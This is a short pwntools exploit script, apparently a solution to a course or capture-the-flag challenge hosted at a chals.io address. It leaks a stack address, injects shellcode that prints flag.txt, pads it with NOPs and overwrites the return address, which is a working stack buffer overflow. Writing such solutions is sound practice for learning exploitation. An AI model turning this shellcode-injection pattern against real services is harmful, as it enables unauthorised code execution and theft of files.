from pwn import * 
binary = args.BIN 
context.terminal = ["tmux", "splitw", "-h"] 
e = context.binary = ELF(binary) 
r = ROP(e)
 
gs = ''' 
continue 
''' 

def start(): 
  if args.GDB: 
    return gdb.debug(e.path, gdbscript=gs) 
  elif args.REMOTE: 
    return remote("cse3801-pwn-300.chals.io", 443, ssl=True, sni="cse3801-pwn-300.chals.io") 
  else: 
    return process(e.path) 

p = start() 
#x = cyclic(500) 
#p.recvuntil("You say >>> ") 
#p.sendline(x) 
p.recvuntil("<<< The game begins at 0x")
start_address = int(p.recv(12), 16)
start_address = p64(start_address) 
shellcode = asm(shellcraft.cat("flag.txt")) 
padding = asm("nop") * (120 - len(shellcode)) 
p.sendline(shellcode + padding + start_address) 
response = p.recvall().decode() 
print(response) 
p.interactive()
